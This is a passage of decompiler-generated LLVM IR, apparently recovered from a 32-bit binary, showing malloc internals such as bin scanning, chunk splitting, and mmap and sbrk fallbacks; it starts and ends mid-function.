  %v0_80615bc = phi i32 [ %v1_80615a1, %dec_label_pc_80615b2 ], [ %v0_80615bc.pre, %dec_label_pc_80615b7 ]
  %v5_80615be = sub i32 %v0_80615bc, %v8_8061391
  store i32 %v5_80615be, i32* %esi.global-to-local, align 4
  %v2_80615c2 = add i32 %v1_80615c2, 12
  %v3_80615c2 = inttoptr i32 %v2_80615c2 to i32*
  store i32 %v0_80615c2, i32* %v3_80615c2, align 4
  %v0_80615c5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80615c5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80615c5 = add i32 %v1_80615c5, 8
  %v3_80615c5 = inttoptr i32 %v2_80615c5 to i32*
  store i32 %v0_80615c5, i32* %v3_80615c5, align 4
  %v0_80615c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80615c8 = add i32 %v0_80615c8, 8
  store i32 %v1_80615c8, i32* @ecx, align 4
  %v0_80615cb = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_80615cb, 16
  br i1 %tmp138, label %dec_label_pc_80615d0, label %dec_label_pc_80615d7

dec_label_pc_80615d0:                             ; preds = %dec_label_pc_80615bc
  %v0_80615d0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615d0 = add i32 %v0_80615c8, 4
  %v3_80615d0 = add i32 %v2_80615d0, %v0_80615d0
  %v4_80615d0 = inttoptr i32 %v3_80615d0 to i32*
  %v5_80615d0 = load i32, i32* %v4_80615d0, align 4
  %v6_80615d0 = or i32 %v5_80615d0, 1
  store i32 %v6_80615d0, i32* %v4_80615d0, align 4
  br label %dec_label_pc_8061603

dec_label_pc_80615d7:                             ; preds = %dec_label_pc_80615bc
  %v2_80615db = add i32 %v0_80615c8, %v8_8061391
  store i32 %v2_80615db, i32* %edx.global-to-local, align 4
  %v1_80615de = or i32 %v8_8061391, 1
  store i32 %v1_80615de, i32* %ebx.global-to-local, align 4
  %v2_80615e1 = add i32 %v0_80615c8, 4
  %v3_80615e1 = inttoptr i32 %v2_80615e1 to i32*
  store i32 %v1_80615de, i32* %v3_80615e1, align 4
  %v0_80615e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615e6 = or i32 %v0_80615e4, 1
  store i32 %v1_80615e6, i32* %eax.global-to-local, align 4
  %v0_80615e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80615e9 = load i32, i32* @ebp, align 4
  %v2_80615e9 = add i32 %v1_80615e9, 8
  %v3_80615e9 = inttoptr i32 %v2_80615e9 to i32*
  store i32 %v0_80615e9, i32* %v3_80615e9, align 4
  %v0_80615ec = load i32, i32* %edx.global-to-local, align 4
  %v1_80615ec = load i32, i32* @ebp, align 4
  %v2_80615ec = add i32 %v1_80615ec, 12
  %v3_80615ec = inttoptr i32 %v2_80615ec to i32*
  store i32 %v0_80615ec, i32* %v3_80615ec, align 4
  %v0_80615ef = load i32, i32* %edx.global-to-local, align 4
  %v1_80615ef = add i32 %v0_80615ef, 8
  %v2_80615ef = inttoptr i32 %v1_80615ef to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80615ef, align 4
  %v0_80615f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80615f6 = add i32 %v0_80615f6, 12
  %v2_80615f6 = inttoptr i32 %v1_80615f6 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80615f6, align 4
  %v0_80615fd = load i32, i32* %eax.global-to-local, align 4
  %v1_80615fd = load i32, i32* %edx.global-to-local, align 4
  %v2_80615fd = add i32 %v1_80615fd, 4
  %v3_80615fd = inttoptr i32 %v2_80615fd to i32*
  store i32 %v0_80615fd, i32* %v3_80615fd, align 4
  %v0_8061600 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061600 = load i32, i32* %edx.global-to-local, align 4
  %v3_8061600 = add i32 %v1_8061600, %v0_8061600
  %v4_8061600 = inttoptr i32 %v3_8061600 to i32*
  store i32 %v0_8061600, i32* %v4_8061600, align 4
  br label %dec_label_pc_8061603

dec_label_pc_8061603:                             ; preds = %dec_label_pc_80615d0, %dec_label_pc_80615d7
  %v0_8061603 = load i32, i32* @ecx, align 4
  store i32 %v0_8061603, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_806160c:                             ; preds = %dec_label_pc_806159b, %dec_label_pc_806158b
  %v4_80615b2 = phi i32 [ %storemerge2.pre, %dec_label_pc_806158b ], [ %v3_806159e, %dec_label_pc_806159b ]
  store i32 %v4_80615b2, i32* %eax.global-to-local, align 4
  %v12_806160c = icmp eq i32 %v4_80615b2, %v2_806158f
  %v1_806160e = icmp eq i1 %v12_806160c, false
  br i1 %v1_806160e, label %dec_label_pc_806159b, label %dec_label_pc_8061610.loopexit

dec_label_pc_8061610.loopexit:                    ; preds = %dec_label_pc_806160c
  br label %dec_label_pc_8061610

dec_label_pc_8061610:                             ; preds = %dec_label_pc_8061610.loopexit, %dec_label_pc_806157d
  store i32 1, i32* @esi, align 4
  %v1_8061619 = add i32 %stack_var_-56.0, 1
  store i32 %v1_8061619, i32* %ecx.global-to-local, align 4
  %v2_806161c = udiv i32 %v1_8061619, 32
  store i32 %v2_806161c, i32* @edi, align 4
  %v1_806161f = mul nuw nsw i32 %v2_806161c, 4
  %v2_806161f = add i32 %v1_806161f, ptrtoint (i32* @global_var_8078c04.1614 to i32)
  %v3_806161f = inttoptr i32 %v2_806161f to i32*
  %v4_806161f = load i32, i32* %v3_806161f, align 4
  store i32 %v4_806161f, i32* %edx.global-to-local, align 4
  %v1_8061626 = mul i32 %v1_8061619, 8
  %v2_8061626 = add i32 %v1_8061626, ptrtoint (i32* @global_var_80788fc.1609 to i32)
  store i32 %v2_8061626, i32* %ebx.global-to-local, align 4
  %v1_806162d = urem i32 %v1_8061619, 32
  %v2_806162d = icmp eq i32 %v1_806162d, 0
  store i32 %v1_806162d, i32* %ecx.global-to-local, align 4
  br i1 %v2_806162d, label %.preheader, label %bb86

bb86:                                             ; preds = %dec_label_pc_8061610
  %v5_8061630 = shl i32 1, %v1_806162d
  store i32 %v5_8061630, i32* @esi, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8061610, %bb86, %dec_label_pc_8061671
  %v1_8061632 = phi i32 [ %v1_8061632.pre, %dec_label_pc_8061671 ], [ %v4_806161f, %bb86 ], [ %v4_806161f, %dec_label_pc_8061610 ]
  %v0_8061636 = phi i32 [ %v0_8061632.pre, %dec_label_pc_8061671 ], [ %v5_8061630, %bb86 ], [ 1, %dec_label_pc_8061610 ]
  %tmp87 = icmp ule i32 %v0_8061636, %v1_8061632
  %v1_8061636 = icmp eq i32 %v0_8061636, 0
  %v1_8061638 = icmp eq i1 %v1_8061636, false
  %or.cond = and i1 %tmp87, %v1_8061638
  br i1 %or.cond, label %dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge, label %dec_label_pc_806163a.preheader

dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge: ; preds = %.preheader
  %v0_806166113.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061666.preheader

dec_label_pc_806163a.preheader:                   ; preds = %.preheader
  %v0_806163a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806163a

dec_label_pc_806163a:                             ; preds = %dec_label_pc_806163a.preheader, %dec_label_pc_8061644
  %v0_806163a = phi i32 [ %v0_806163a.pre, %dec_label_pc_806163a.preheader ], [ %v1_806163a, %dec_label_pc_8061644 ]
  %v1_806163a = add i32 %v0_806163a, 1
  store i32 %v1_806163a, i32* @edi, align 4
  %v6_806163e = icmp ugt i32 %v1_806163a, 2
  br i1 %v6_806163e, label %dec_label_pc_80616f5.loopexit, label %dec_label_pc_8061644

dec_label_pc_8061644:                             ; preds = %dec_label_pc_806163a
  %v1_8061644 = mul i32 %v1_806163a, 4
  %v2_8061644 = add i32 %v1_8061644, ptrtoint (i32* @global_var_8078c04.1614 to i32)
  %v3_8061644 = inttoptr i32 %v2_8061644 to i32*
  %v4_8061644 = load i32, i32* %v3_8061644, align 4
  store i32 %v4_8061644, i32* %edx.global-to-local, align 4
  %v1_806164b = icmp eq i32 %v4_8061644, 0
  br i1 %v1_806164b, label %dec_label_pc_806163a, label %dec_label_pc_806164f

dec_label_pc_806164f:                             ; preds = %dec_label_pc_8061644
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8061656 = mul i32 %v1_806163a, 256
  store i32 %v2_8061656, i32* %eax.global-to-local, align 4
  %v1_8061659 = add i32 %v2_8061656, ptrtoint (i32* @global_var_80788fc.1609 to i32)
  store i32 %v1_8061659, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061666.preheader

dec_label_pc_8061666.preheader:                   ; preds = %dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge, %dec_label_pc_806164f
  %v0_806166113 = phi i32 [ %v1_8061659, %dec_label_pc_806164f ], [ %v0_806166113.pre, %dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge ]
  %v0_8061677 = phi i32 [ %v4_8061644, %dec_label_pc_806164f ], [ %v1_8061632, %dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_806164f ], [ %v0_8061636, %dec_label_pc_8061636.dec_label_pc_8061666.preheader_crit_edge ]
  %v2_80616665 = and i32 %esi.promoted, %v0_8061677
  %v3_80616666 = icmp eq i32 %v2_80616665, 0
  br i1 %v3_80616666, label %dec_label_pc_8061661, label %dec_label_pc_806166a

dec_label_pc_8061661:                             ; preds = %dec_label_pc_8061666.preheader, %dec_label_pc_8061661
  %v2_806166415 = phi i32 [ %v2_8061664, %dec_label_pc_8061661 ], [ %esi.promoted, %dec_label_pc_8061666.preheader ]
  %v0_806166114 = phi i32 [ %v1_8061661, %dec_label_pc_8061661 ], [ %v0_806166113, %dec_label_pc_8061666.preheader ]
  %v1_8061661 = add i32 %v0_806166114, 8
  %v2_8061664 = mul i32 %v2_806166415, 2
  %v2_8061666 = and i32 %v2_8061664, %v0_8061677
  %v3_8061666 = icmp eq i32 %v2_8061666, 0
  br i1 %v3_8061666, label %dec_label_pc_8061661, label %dec_label_pc_8061666.dec_label_pc_806166a_crit_edge

dec_label_pc_8061666.dec_label_pc_806166a_crit_edge: ; preds = %dec_label_pc_8061661
  store i32 %v1_8061661, i32* %ebx.global-to-local, align 4
  store i32 %v2_8061664, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806166a

dec_label_pc_806166a:                             ; preds = %dec_label_pc_8061666.dec_label_pc_806166a_crit_edge, %dec_label_pc_8061666.preheader
  %v0_8061671 = phi i32 [ %v2_8061664, %dec_label_pc_8061666.dec_label_pc_806166a_crit_edge ], [ %esi.promoted, %dec_label_pc_8061666.preheader ]
  %v1_8061694 = phi i32 [ %v1_8061661, %dec_label_pc_8061666.dec_label_pc_806166a_crit_edge ], [ %v0_806166113, %dec_label_pc_8061666.preheader ]
  %v1_806166a = add i32 %v1_8061694, 12
  %v2_806166a = inttoptr i32 %v1_806166a to i32*
  %v3_806166a = load i32, i32* %v2_806166a, align 4
  store i32 %v3_806166a, i32* @ecx, align 4
  %v12_806166d = icmp eq i32 %v3_806166a, %v1_8061694
  %v1_806166f = icmp eq i1 %v12_806166d, false
  br i1 %v1_806166f, label %dec_label_pc_8061685, label %dec_label_pc_8061671

dec_label_pc_8061671:                             ; preds = %dec_label_pc_806166a
  %v2_8061673 = mul i32 %v0_8061671, 2
  store i32 %v2_8061673, i32* @esi, align 4
  %v1_8061675 = sub i32 -1, %v0_8061671
  store i32 %v1_8061675, i32* %eax.global-to-local, align 4
  %v2_8061677 = and i32 %v0_8061677, %v1_8061675
  store i32 %v2_8061677, i32* %edx.global-to-local, align 4
  %v1_8061679 = add i32 %v3_806166a, 8
  store i32 %v1_8061679, i32* %ebx.global-to-local, align 4
  %v1_806167c = load i32, i32* @edi, align 4
  %v2_806167c = mul i32 %v1_806167c, 4
  %v3_806167c = add i32 %v2_806167c, ptrtoint (i32* @global_var_8078c04.1614 to i32)
  %v4_806167c = inttoptr i32 %v3_806167c to i32*
  store i32 %v2_8061677, i32* %v4_806167c, align 4
  %v0_8061632.pre = load i32, i32* @esi, align 4
  %v1_8061632.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8061685:                             ; preds = %dec_label_pc_806166a
  %v1_8061685 = add i32 %v3_806166a, 4
  %v2_8061685 = inttoptr i32 %v1_8061685 to i32*
  %v3_8061685 = load i32, i32* %v2_8061685, align 4
  store i32 %v3_8061685, i32* %edx.global-to-local, align 4
  %v1_8061688 = add i32 %v3_806166a, 12
  %v2_8061688 = inttoptr i32 %v1_8061688 to i32*
  %v3_8061688 = load i32, i32* %v2_8061688, align 4
  store i32 %v3_8061688, i32* %eax.global-to-local, align 4
  %v1_806168b = and i32 %v3_8061685, -4
  store i32 %v1_806168b, i32* %edx.global-to-local, align 4
  %v5_8061690 = sub i32 %v1_806168b, %v8_8061391
  store i32 %v5_8061690, i32* %esi.global-to-local, align 4
  store i32 %v3_8061688, i32* %v2_806166a, align 4
  %v0_8061697 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061697 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061697 = add i32 %v1_8061697, 8
  %v3_8061697 = inttoptr i32 %v2_8061697 to i32*
  store i32 %v0_8061697, i32* %v3_8061697, align 4
  %v0_806169a = load i32, i32* %esi.global-to-local, align 4
  %tmp139 = icmp ult i32 %v0_806169a, 16
  %v0_806169f = load i32, i32* @ecx, align 4
  br i1 %tmp139, label %dec_label_pc_806169f, label %dec_label_pc_80616a6

dec_label_pc_806169f:                             ; preds = %dec_label_pc_8061685
  %v1_806169f = load i32, i32* %edx.global-to-local, align 4
  %v2_806169f = add i32 %v0_806169f, 4
  %v3_806169f = add i32 %v2_806169f, %v1_806169f
  %v4_806169f = inttoptr i32 %v3_806169f to i32*
  %v5_806169f = load i32, i32* %v4_806169f, align 4
  %v6_806169f = or i32 %v5_806169f, 1
  store i32 %v6_806169f, i32* %v4_806169f, align 4
  br label %dec_label_pc_80616ed

dec_label_pc_80616a6:                             ; preds = %dec_label_pc_8061685
  %v2_80616aa = add i32 %v0_806169f, %v8_8061391
  store i32 %v2_80616aa, i32* %eax.global-to-local, align 4
  %v1_80616b3 = load i32, i32* @ebp, align 4
  %v2_80616b3 = add i32 %v1_80616b3, 8
  %v3_80616b3 = inttoptr i32 %v2_80616b3 to i32*
  store i32 %v2_80616aa, i32* %v3_80616b3, align 4
  %v0_80616b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80616b6 = load i32, i32* @ebp, align 4
  %v2_80616b6 = add i32 %v1_80616b6, 12
  %v3_80616b6 = inttoptr i32 %v2_80616b6 to i32*
  store i32 %v0_80616b6, i32* %v3_80616b6, align 4
  %v0_80616b9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80616b9 = add i32 %v0_80616b9, 8
  %v2_80616b9 = inttoptr i32 %v1_80616b9 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80616b9, align 4
  %v0_80616c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80616c0 = add i32 %v0_80616c0, 12
  %v2_80616c0 = inttoptr i32 %v1_80616c0 to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_80616c0, align 4
  %v0_80616c7 = load i32, i32* @global_var_8078900.1610, align 256
  store i32 %v0_80616c7, i32* %edx.global-to-local, align 4
  %v0_80616cd = load i32, i32* %esi.global-to-local, align 4
  %v1_80616cd = load i32, i32* %eax.global-to-local, align 4
  %v3_80616cd = add i32 %v1_80616cd, %v0_80616cd
  %v4_80616cd = inttoptr i32 %v3_80616cd to i32*
  store i32 %v0_80616cd, i32* %v4_80616cd, align 4
  %v3_80616d0 = load i32, i32* %edx.global-to-local, align 4
  %v4_80616d0 = load i32, i32* %eax.global-to-local, align 4
  %v5_80616d0 = select i1 %v8_80613e0, i32 %v4_80616d0, i32 %v3_80616d0
  %v4_80616d3 = or i32 %v8_8061391, 1
  store i32 %v5_80616d0, i32* @global_var_8078900.1610, align 256
  %v0_80616de = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80616d3, i32* %ebx.global-to-local, align 4
  %v1_80616e4 = or i32 %v0_80616de, 1
  store i32 %v1_80616e4, i32* %edx.global-to-local, align 4
  %v1_80616e7 = load i32, i32* @ecx, align 4
  %v2_80616e7 = add i32 %v1_80616e7, 4
  %v3_80616e7 = inttoptr i32 %v2_80616e7 to i32*
  store i32 %v4_80616d3, i32* %v3_80616e7, align 4
  %v0_80616ea = load i32, i32* %edx.global-to-local, align 4
  %v1_80616ea = load i32, i32* %eax.global-to-local, align 4
  %v2_80616ea = add i32 %v1_80616ea, 4
  %v3_80616ea = inttoptr i32 %v2_80616ea to i32*
  store i32 %v0_80616ea, i32* %v3_80616ea, align 4
  br label %dec_label_pc_80616ed

dec_label_pc_80616ed:                             ; preds = %dec_label_pc_806169f, %dec_label_pc_80616a6
  %v0_80616ed = load i32, i32* @ecx, align 4
  %v1_80616ed = add i32 %v0_80616ed, 8
  store i32 %v1_80616ed, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_80616f5.loopexit:                    ; preds = %dec_label_pc_806163a
  br label %dec_label_pc_80616f5

dec_label_pc_80616f5:                             ; preds = %dec_label_pc_80616f5.loopexit, %dec_label_pc_806139f, %dec_label_pc_80613a7
  %v0_80616f5 = load i32, i32* @global_var_80788fc.1609, align 4
  store i32 %v0_80616f5, i32* @ebx, align 4
  store i32 %v8_8061391, i32* %eax.global-to-local, align 4
  %v1_80616ff = add i32 %v0_80616f5, 4
  %v2_80616ff = inttoptr i32 %v1_80616ff to i32*
  %v3_80616ff = load i32, i32* %v2_80616ff, align 4
  %v1_8061702 = add i32 %v8_8061391, 16
  store i32 %v1_8061702, i32* %eax.global-to-local, align 4
  %v1_8061709 = and i32 %v3_80616ff, -4
  store i32 %v1_8061709, i32* @ecx, align 4
  %v7_806170c = icmp ult i32 %v1_8061709, %v1_8061702
  br i1 %v7_806170c, label %dec_label_pc_8061735, label %dec_label_pc_8061710

dec_label_pc_8061710:                             ; preds = %dec_label_pc_80616f5
  %v5_8061714 = sub i32 %v1_8061709, %v8_8061391
  store i32 %v5_8061714, i32* %ecx.global-to-local, align 4
  %v2_8061718 = add i32 %v0_80616f5, %v8_8061391
  store i32 %v2_8061718, i32* %edx.global-to-local, align 4
  %v1_806171b = or i32 %v8_8061391, 1
  store i32 %v1_806171b, i32* %eax.global-to-local, align 4
  store i32 %v1_806171b, i32* %v2_80616ff, align 4
  %v0_8061721 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061721 = or i32 %v0_8061721, 1
  store i32 %v1_8061721, i32* @ecx, align 4
  %v0_8061724 = load i32, i32* @ebx, align 4
  %v1_8061724 = add i32 %v0_8061724, 8
  store i32 %v1_8061724, i32* %ebx.global-to-local, align 4
  %v0_8061727 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8061727, i32* @global_var_80788fc.1609, align 4
  %v2_806172d = add i32 %v0_8061727, 4
  %v3_806172d = inttoptr i32 %v2_806172d to i32*
  store i32 %v1_8061721, i32* %v3_806172d, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_8061735:                             ; preds = %dec_label_pc_80616f5
  %v0_8061735 = load i8, i8* @global_var_80788d0.1607, align 16
  %v1_8061735 = and i8 %v0_8061735, 2
  %v2_8061735 = icmp eq i8 %v1_8061735, 0
  %v0_806173c = load i32, i32* @global_var_8078c2c.1615, align 4
  store i32 %v0_806173c, i32* %edx.global-to-local, align 4
  br i1 %v2_8061735, label %dec_label_pc_8061767, label %dec_label_pc_8061744

dec_label_pc_8061744:                             ; preds = %dec_label_pc_8061735
  %v2_806174c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80788d0.1607 to i32*))
  store i32 ptrtoint (i8* @global_var_80788d0.1607 to i32), i32* @ebx, align 4
  %v1_8061756 = add i32 %v8_8061391, -7
  store i32 %v1_8061756, i32* %eax.global-to-local, align 4
  %v1_806175a = call i32 @malloc(i32 %v1_8061756)
  store i32 %v1_806175a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061acc

dec_label_pc_8061767:                             ; preds = %dec_label_pc_8061735
  store i32 %v8_8061391, i32* %ebx.global-to-local, align 4
  %v1_806176b = add i32 %v0_806173c, -1
  store i32 %v1_806176b, i32* %ecx.global-to-local, align 4
  %v1_806176e = load i32, i32* @global_var_8078c1c.1616, align 4
  %v7_806176e = icmp ult i32 %v8_8061391, %v1_806176e
  br i1 %v7_806176e, label %dec_label_pc_806184d, label %dec_label_pc_806177e

dec_label_pc_806177e:                             ; preds = %dec_label_pc_8061767
  %v0_806177e = load i32, i32* @global_var_8078c20.1617, align 32
  store i32 %v0_806177e, i32* %eax.global-to-local, align 4
  %v1_8061783 = load i32, i32* @global_var_8078c24.1618, align 4
  %v5_8061789 = icmp slt i32 %v0_806177e, %v1_8061783
  br i1 %v5_8061789, label %dec_label_pc_806178f, label %dec_label_pc_806184d

dec_label_pc_806178f:                             ; preds = %dec_label_pc_806177e
  %v2_8061791 = add i32 %v8_8061391, 10
  %v3_8061791 = add i32 %v2_8061791, %v0_806173c
  %v1_8061795 = sub i32 0, %v0_806173c
  store i32 %v1_8061795, i32* %eax.global-to-local, align 4
  %v2_8061797 = and i32 %v3_8061791, %v1_8061795
  store i32 %v2_8061797, i32* @ebx, align 4
  %tmp140 = icmp ugt i32 %v2_8061797, %v8_8061391
  br i1 %tmp140, label %dec_label_pc_80617a3, label %dec_label_pc_806184d

dec_label_pc_80617a3:                             ; preds = %dec_label_pc_806178f
  %v8_80617b0 = call i32 @mmap(i32 0, i32 %v2_8061797, i32 3, i32 34, i32 0, i32 0, i32 %v1_806176b, i32 %v1_806176b)
  store i32 %v8_80617b0, i32* %eax.global-to-local, align 4
  %v10_80617b8 = icmp eq i32 %v8_80617b0, -1
  store i32 %v8_80617b0, i32* %edx.global-to-local, align 4
  br i1 %v10_80617b8, label %dec_label_pc_80617a3.dec_label_pc_806184d_crit_edge, label %dec_label_pc_80617c3

dec_label_pc_80617a3.dec_label_pc_806184d_crit_edge: ; preds = %dec_label_pc_80617a3
  %v0_806184d.pre = load i32, i32* @global_var_80788fc.1609, align 4
  br label %dec_label_pc_806184d

dec_label_pc_80617c3:                             ; preds = %dec_label_pc_80617a3
  %v1_80617c5 = urem i32 %v8_80617b0, 8
  %v2_80617c5 = icmp eq i32 %v1_80617c5, 0
  store i32 %v1_80617c5, i32* %ecx.global-to-local, align 4
  br i1 %v2_80617c5, label %dec_label_pc_80617de, label %dec_label_pc_80617ca

dec_label_pc_80617ca:                             ; preds = %dec_label_pc_80617c3
  %v2_80617cf = sub nsw i32 8, %v1_80617c5
  store i32 %v2_80617cf, i32* %eax.global-to-local, align 4
  %v2_80617d1 = add i32 %v2_80617cf, %v8_80617b0
  store i32 %v2_80617d1, i32* @ecx, align 4
  %v0_80617d4 = load i32, i32* @ebx, align 4
  %v2_80617d6 = sub i32 %v0_80617d4, %v2_80617cf
  store i32 %v2_80617d6, i32* %edx.global-to-local, align 4
  %v2_80617d8 = inttoptr i32 %v2_80617d1 to i32*
  store i32 %v2_80617cf, i32* %v2_80617d8, align 4
  br label %dec_label_pc_80617e8

dec_label_pc_80617de:                             ; preds = %dec_label_pc_80617c3
  store i32 %v8_80617b0, i32* @ecx, align 4
  %v1_80617e0 = inttoptr i32 %v8_80617b0 to i32*
  store i32 0, i32* %v1_80617e0, align 4
  br label %dec_label_pc_80617e8

dec_label_pc_80617e8:                             ; preds = %dec_label_pc_80617ca, %dec_label_pc_80617de
  %storemerge.in = phi i32* [ @edx, %dec_label_pc_80617ca ], [ @ebx, %dec_label_pc_80617de ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80617e8 = or i32 %storemerge, 2
  %v1_80617eb = load i32, i32* @ecx, align 4
  %v2_80617eb = add i32 %v1_80617eb, 4
  %v3_80617eb = inttoptr i32 %v2_80617eb to i32*
  store i32 %v1_80617e8, i32* %v3_80617eb, align 4
  %v0_80617ee = load i32, i32* @global_var_8078c20.1617, align 32
  %v0_80617f3 = load i32, i32* @global_var_8078c40.1619, align 64
  %v1_80617f9 = add i32 %v0_80617ee, 1
  %v1_80617fa = load i32, i32* @global_var_8078c28.1620, align 8
  %v2_80617fa = sub i32 %v1_80617f9, %v1_80617fa
  %v8_80617fa = xor i32 %v1_80617fa, %v1_80617f9
  %v9_80617fa = xor i32 %v2_80617fa, %v1_80617f9
  %v10_80617fa = and i32 %v9_80617fa, %v8_80617fa
  %v11_80617fa = icmp slt i32 %v10_80617fa, 0
  %v12_80617fa = icmp eq i32 %v2_80617fa, 0
  %v13_80617fa = icmp slt i32 %v2_80617fa, 0
  store i32 %v1_80617f9, i32* @global_var_8078c20.1617, align 32
  %v3_8061805 = icmp ne i1 %v13_80617fa, %v11_80617fa
  %v4_8061805 = or i1 %v12_80617fa, %v3_8061805
  %v7_8061805 = select i1 %v4_8061805, i32 %v1_80617fa, i32 %v1_80617f9
  store i32 %v7_8061805, i32* @global_var_8078c28.1620, align 8
  %v0_8061811 = load i32, i32* @ebx, align 4
  %v1_8061813 = load i32, i32* @global_var_8078c34.1621, align 4
  %v2_8061813 = add i32 %v1_8061813, %v0_8061811
  store i32 %v2_8061813, i32* @global_var_8078c34.1621, align 4
  %tmp89 = icmp ule i32 %v2_8061813, %v0_80617f3
  %v5_8061824 = select i1 %tmp89, i32 %v0_80617f3, i32 %v2_8061813
  store i32 %v5_8061824, i32* %edx.global-to-local, align 4
  %v1_8061827 = load i32, i32* @global_var_8078c38.1622, align 8
  %v2_8061827 = add i32 %v1_8061827, %v2_8061813
  store i32 %v5_8061824, i32* @global_var_8078c40.1619, align 64
  %v1_8061833 = load i32, i32* @global_var_8078c44.1623, align 4
  %tmp141 = icmp ule i32 %v2_8061827, %v1_8061833
  %v5_8061839 = select i1 %tmp141, i32 %v1_8061833, i32 %v2_8061827
  store i32 %v5_8061839, i32* @global_var_8078c44.1623, align 4
  %v0_8061845 = load i32, i32* @ecx, align 4
  %v1_8061845 = add i32 %v0_8061845, 8
  store i32 %v1_8061845, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061acc

dec_label_pc_806184d:                             ; preds = %dec_label_pc_806178f, %dec_label_pc_80617a3.dec_label_pc_806184d_crit_edge, %dec_label_pc_806177e, %dec_label_pc_8061767
  %v0_806184d = phi i32 [ %v0_806184d.pre, %dec_label_pc_80617a3.dec_label_pc_806184d_crit_edge ], [ %v0_80616f5, %dec_label_pc_806177e ], [ %v0_80616f5, %dec_label_pc_806178f ], [ %v0_80616f5, %dec_label_pc_8061767 ]
  store i32 %v0_806184d, i32* @ecx, align 4
  %v0_8061853 = load i32, i32* @global_var_8078c18.1624, align 8
  store i32 %v0_8061853, i32* %eax.global-to-local, align 4
  store i32 %v1_806176b, i32* %ebx.global-to-local, align 4
  %v1_806185c = add i32 %v0_806184d, 4
  %v2_806185c = inttoptr i32 %v1_806185c to i32*
  %v3_806185c = load i32, i32* %v2_806185c, align 4
  %v1_8061866 = sub i32 0, %v0_806173c
  store i32 %v1_8061866, i32* @ebx, align 4
  %v1_806186c = and i32 %v3_806185c, -4
  %v2_806186c = icmp eq i32 %v1_806186c, 0
  store i32 %v1_806186c, i32* @ebp, align 4
  %v0_8061873 = load i8, i8* @global_var_8078c30.1625, align 16
  %v1_8061873 = urem i8 %v0_8061873, 2
  %v2_8061873 = icmp eq i8 %v1_8061873, 0
  %v1_806187e = icmp eq i1 %v2_8061873, false
  %v1_806186c.op = sub i32 0, %v1_806186c
  %v2_8061871.neg = select i1 %v1_806187e, i32 %v1_806186c.op, i32 0
  %v5_8061862 = add i32 %v1_8061702, %v0_8061853
  %v4_806187e = add i32 %v5_8061862, %v2_8061871.neg
  store i32 %v4_806187e, i32* %eax.global-to-local, align 4
  store i32 %v1_806176b, i32* @edx, align 4
  %v2_8061885 = add i32 %v4_806187e, %v1_806176b
  %v2_8061888 = and i32 %v2_8061885, %v1_8061866
  store i32 %v2_8061888, i32* @esi, align 4
  %tmp90 = icmp slt i32 %v2_8061888, 1
  br i1 %tmp90, label %dec_label_pc_80618a3, label %dec_label_pc_8061890

dec_label_pc_8061890:                             ; preds = %dec_label_pc_806184d
  %v1_8061894 = call i32 @__GI_sbrk(i32 %v2_8061888)
  store i32 %v1_8061894, i32* %eax.global-to-local, align 4
  %v10_806189c = icmp eq i32 %v1_8061894, -1
  store i32 %v1_8061894, i32* @ebx, align 4
  %v1_80618a1 = icmp eq i1 %v10_806189c, false
  br i1 %v1_80618a1, label %dec_label_pc_80618fb, label %dec_label_pc_8061890.dec_label_pc_80618a3_crit_edge

dec_label_pc_8061890.dec_label_pc_80618a3_crit_edge: ; preds = %dec_label_pc_8061890
  %v0_80618a3.pre = load i8, i8* @global_var_8078c30.1625, align 16
  br label %dec_label_pc_80618a3

dec_label_pc_80618a3:                             ; preds = %dec_label_pc_8061890.dec_label_pc_80618a3_crit_edge, %dec_label_pc_806184d
  %v0_80618a3 = phi i8 [ %v0_80618a3.pre, %dec_label_pc_8061890.dec_label_pc_80618a3_crit_edge ], [ %v0_8061873, %dec_label_pc_806184d ]
  %v1_80618a3 = urem i8 %v0_80618a3, 2
  %v2_80618a3 = icmp eq i8 %v1_80618a3, 0
  br i1 %v2_80618a3, label %dec_label_pc_80618a3.dec_label_pc_80618bb_crit_edge, label %dec_label_pc_80618ac

dec_label_pc_80618a3.dec_label_pc_80618bb_crit_edge: ; preds = %dec_label_pc_80618a3
